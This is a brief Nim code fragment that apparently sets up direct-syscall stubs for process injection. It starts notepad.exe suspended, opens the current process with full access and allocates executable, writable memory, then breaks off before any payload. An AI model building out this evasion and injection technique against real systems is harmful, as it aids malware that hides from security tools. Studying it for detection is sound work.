var SYSCALL_STUB_SIZE: int = 23;
var success: BOOL
var gstub_op: DWORD = 0

let tProcess = startProcess("notepad.exe")
tProcess.suspend() 
defer: tProcess.close()

var cid: CLIENT_ID
cid.UniqueProcess = tProcess.processID
    
let tProcess2 = GetCurrentProcessId()
var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

let syscallStub_1 = VirtualAllocEx(pHandle2, NULL, cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
